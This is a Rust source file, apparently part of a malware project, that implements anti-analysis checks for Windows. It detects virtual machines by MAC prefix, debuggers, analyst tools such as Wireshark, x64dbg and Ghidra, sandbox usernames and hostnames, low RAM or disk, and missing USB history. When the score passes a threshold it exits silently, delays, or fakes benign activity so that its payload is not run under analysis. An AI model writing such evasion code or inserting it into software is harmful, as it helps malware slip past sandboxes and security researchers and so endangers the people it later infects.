#![allow(dead_code)]
use std::path::Path;
use std::time::Duration;
use std::ffi::c_void;

use windows::core::w;
use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE, HWND, LPARAM, MAX_PATH, POINT};
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameW};
use windows::Win32::System::SystemInformation::{
    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, GetCurrentProcess};
use windows::Win32::UI::WindowsAndMessaging::{
    EnumWindows, GetSystemMetrics, GetWindowTextW, SM_CXSCREEN, SM_CYSCREEN, SM_REMOTESESSION,
};
use windows::Win32::Graphics::Gdi::{
    GetDC, GetDeviceCaps, VREFRESH, ReleaseDC,
};
use windows::Win32::NetworkManagement::IpHelper::{
    GetAdaptersInfo, IP_ADAPTER_INFO,
};
use windows::Win32::System::Registry::{
    RegOpenKeyExW, RegQueryInfoKeyW, HKEY_LOCAL_MACHINE, KEY_READ, HKEY,
};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
};
use windows::Win32::Media::MediaFoundation::{
    MFTEnumEx, MFT_CATEGORY_VIDEO_ENCODER, MFT_ENUM_FLAG_HARDWARE,
};
use windows::Win32::Security::{
    GetTokenInformation, TokenElevation, TOKEN_QUERY, TOKEN_ELEVATION, CheckTokenMembership,
};

use crate::core::exit_patcher::safe_exit;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EvasionAction {
    ExitSilently,  // exit immediately
    DelayThenExit, // rand wait and exit
    ReportOnly,    // do nothing, just return result
    FakeBehavior,  // do normal behavior (not run payload)
}

pub struct AntiAnalysisConfig {
    pub min_score_threshold: u32,
    pub action: EvasionAction,
    pub delay_range: (u64, u64),
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            min_score_threshold: 50,
            action: EvasionAction::DelayThenExit,
            delay_range: (30, 120),
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct DetectionItem {
    pub category: String,
    pub reason: String,
    pub weight: u32,
}

#[derive(Debug, Clone, Default)]
pub struct DetectionResult {
    pub total_score: u32,
    pub is_detected: bool,
    pub detections: Vec<DetectionItem>,
}

pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
    let mut result = DetectionResult::default();

    check_hwe(&mut result);
    check_drr(&mut result);
    check_macaddr(&mut result);
    check_usbh(&mut result);
    check_syspec(&mut result);
    check_debugger(&mut result);
    check_blp(&mut result);
    check_blu(&mut result);
    check_mact(&mut result);

    result.is_detected = result.total_score >= config.min_score_threshold;
    result
}

#[allow(dead_code)]
pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
    let result = run_checks(config);

    if result.is_detected {
        match config.action {
            EvasionAction::ExitSilently => {
                safe_exit(0);
            }
            EvasionAction::DelayThenExit => {
                random_delay(config.delay_range);
                safe_exit(0);
            }
            EvasionAction::FakeBehavior => {
                fake_behavior();
                safe_exit(0);
            }
            EvasionAction::ReportOnly => {
                return true;
            }
        }
    }

    false
}

pub fn random_delay(range: (u64, u64)) {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64;
    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
    std::thread::sleep(Duration::from_secs(delay_secs));
}

fn add_detection(result: &mut DetectionResult, category: &str, reason: &str, weight: u32) {
    result.detections.push(DetectionItem {
        category: category.to_string(),
        reason: reason.to_string(),
        weight,
    });
    result.total_score += weight;
}

fn check_hwe(result: &mut DetectionResult) {
    unsafe {
        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
        
        let mut pp_activate: *mut Option<windows::Win32::Media::MediaFoundation::IMFActivate> = std::ptr::null_mut();
        let mut count: u32 = 0;

        let hr = MFTEnumEx(
            MFT_CATEGORY_VIDEO_ENCODER,
            MFT_ENUM_FLAG_HARDWARE,
            None,
            None,
            &mut pp_activate as *mut _,
            &mut count
        );

        if hr.is_ok() {
            if count == 0 {
                add_detection(result, "Hardware", "No Hardware Video Encoders found (MFT)", 100);
            }
        } else {
             add_detection(result, "Hardware", "MFTEnumEx failed or unavailable", 20);
        }

        CoUninitialize();
    }
}

fn check_drr(result: &mut DetectionResult) {
    unsafe {
        let hdc = GetDC(None);
        let refresh_rate = GetDeviceCaps(Some(hdc), VREFRESH);
        
        ReleaseDC(None, hdc);

        if refresh_rate < 29 {
            add_detection(result, "Display", &format!("Low Refresh Rate: {} Hz", refresh_rate), 40);
        }
    }

    unsafe {
        if GetSystemMetrics(SM_REMOTESESSION) != 0 {
             add_detection(result, "Display", "Remote Session Detected (RDP)", 60);
        }
    }
}

fn check_macaddr(result: &mut DetectionResult) {
    let mut buffer_size: u32 = 15000;
    let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
    
    unsafe {
        let ret = GetAdaptersInfo(Some(buffer.as_mut_ptr() as *mut IP_ADAPTER_INFO), &mut buffer_size);
        if ret == 0 { // NO_ERROR
            let mut adapter = *(buffer.as_ptr() as *const IP_ADAPTER_INFO);
            loop {
                let mac_len = adapter.AddressLength as usize;
                if mac_len >= 3 {
                    let mac = &adapter.Address[0..6]; // MAC is 6 bytes
                    let prefix = (mac[0], mac[1], mac[2]);

                    match prefix {
                        (0x00, 0x0C, 0x29) => add_detection(result, "Network", "MAC: VMware", 80),
                        (0x00, 0x50, 0x56) => add_detection(result, "Network", "MAC: VMware", 80),
                        (0x00, 0x05, 0x69) => add_detection(result, "Network", "MAC: VMware", 80),
                        (0x08, 0x00, 0x27) => add_detection(result, "Network", "MAC: VirtualBox", 80),
                        (0x00, 0x15, 0x5D) => add_detection(result, "Network", "MAC: Hyper-V", 80),
                        (0x52, 0x54, 0x00) => add_detection(result, "Network", "MAC: KVM/QEMU", 80),
                        (0x00, 0x16, 0x3E) => add_detection(result, "Network", "MAC: Xen", 80),
                        (0x00, 0x1C, 0x42) => add_detection(result, "Network", "MAC: Parallels", 80),
                        _ => {}
                    }
                }

                if adapter.Next.is_null() {
                    break;
                }
                adapter = *adapter.Next;
            }
        }
    }
}

fn check_usbh(result: &mut DetectionResult) {
    let keys_to_check = [
        r"SYSTEM\CurrentControlSet\Enum\USBSTOR",
        r"SYSTEM\CurrentControlSet\Enum\USB",
    ];

    for key in keys_to_check {
        unsafe {
            let mut hkey: HKEY = HKEY::default();
            let wide_key = windows::core::HSTRING::from(key);
            
            let opened = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE, 
                windows::core::PCWSTR::from_raw(wide_key.as_ptr()), 
                Some(0), 
                KEY_READ, 
                &mut hkey
            );

            if opened.is_ok() {
                let mut subkeys_count: u32 = 0;
                let _ = RegQueryInfoKeyW(
                    hkey,
                    Some(windows::core::PWSTR::null()),
                    None,
                    None,
                    Some(&mut subkeys_count),
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                );
                
                if key.contains("USBSTOR") && subkeys_count == 0 {
                    add_detection(result, "Environment", "No USB Storage history detected", 30);
                }

                let _ = CloseHandle(HANDLE(hkey.0 as isize as *mut c_void));
            }
        }
    }
}

fn check_syspec(result: &mut DetectionResult) {
    unsafe {
        let mut mem_status = MEMORYSTATUSEX::default();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
            let total_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
            if total_gb < 2 {
                add_detection(result, "Specs", &format!("Low RAM: {} GB", total_gb), 50);
            }
        }
    }

    unsafe {
        let mut free_bytes_available = 0u64;
        let mut total_number_of_bytes = 0u64;
        let mut total_number_of_free_bytes = 0u64;
        
        let path = w!("C:\\");
        if GetDiskFreeSpaceExW(
            path,
            Some(&mut free_bytes_available),
            Some(&mut total_number_of_bytes),
            Some(&mut total_number_of_free_bytes),
        ).is_ok() {
            let total_gb = total_number_of_bytes / (1024 * 1024 * 1024);
            if total_gb < 60 {
                add_detection(result, "Specs", &format!("Small Disk: {} GB", total_gb), 40);
            }
        }
    }
}

fn check_debugger(result: &mut DetectionResult) {
    if unsafe { IsDebuggerPresent().as_bool() } {
        add_detection(result, "Debugger", "IsDebuggerPresent() == true", 100);
    }
}

fn check_blp(result: &mut DetectionResult) {
    let blacklist = [
        "wireshark.exe", "fiddler.exe", "x64dbg.exe", "ollydbg.exe", 
        "processhacker.exe", "vmtoolsd.exe", "vboxservice.exe", "joeboxserver.exe",
        "ida.exe", "ida64.exe", "ghidra.exe"
    ];

    let running = get_running_processes();
    let mut found_count = 0;

    for p in &running {
        let lower = p.to_lowercase();
        for &bad in blacklist.iter() {
            if lower == bad {
                add_detection(result, "Process", &format!("Blacklisted process: {}", p), 50);
                found_count += 1;
            }
        }
    }
    
    if running.len() < 40 {
        add_detection(result, "Process", &format!("Low process count: {}", running.len()), 30);
    }
}

fn check_blu(result: &mut DetectionResult) {
    let blacklist = [
        "admin", "user", "sandbox", "virus", "malware", "test", 
        "currentuser", "username", "john", "emily", "george",
        "bruno", "dekker",
    ];

    if let Ok(user) = std::env::var("USERNAME") {
        let lower = user.to_lowercase();
        if blacklist.contains(&lower.as_str()) {
             add_detection(result, "User", &format!("Blacklisted username: {}", user), 60);
        }
    }
    
    if let Ok(host) = std::env::var("COMPUTERNAME") {
        let lower = host.to_lowercase();
        if lower.contains("sandbox") || lower == "user-pc" {
            add_detection(result, "User", &format!("Suspicious hostname: {}", host), 40);
        }
    }
}

fn check_mact(_result: &mut DetectionResult) {}
fn get_running_processes() -> Vec<String> {
    let mut processes = Vec::new();
    unsafe {
        let mut pids = [0u32; 1024];
        let mut bytes_returned = 0u32;
        if EnumProcesses(
            pids.as_mut_ptr(),
            (pids.len() * std::mem::size_of::<u32>()) as u32,
            &mut bytes_returned,
        ).is_ok() {
            let count = (bytes_returned as usize) / std::mem::size_of::<u32>();
            for &pid in &pids[..count] {
                if pid == 0 { continue; }
                if let Ok(handle) = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid) {
                    let mut name = [0u16; MAX_PATH as usize];
                    let len = GetModuleBaseNameW(handle, None, &mut name);
                    if len > 0 {
                        let name_str = String::from_utf16_lossy(&name[..len as usize]);
                        processes.push(name_str);
                    }
                    let _ = CloseHandle(handle);
                }
            }
        }
    }
    processes
}

fn fake_behavior() {
    random_delay((2, 5));
    let _ = std::fs::read_to_string("C:\\Windows\\System32\\drivers\\etc\\hosts"); 
}
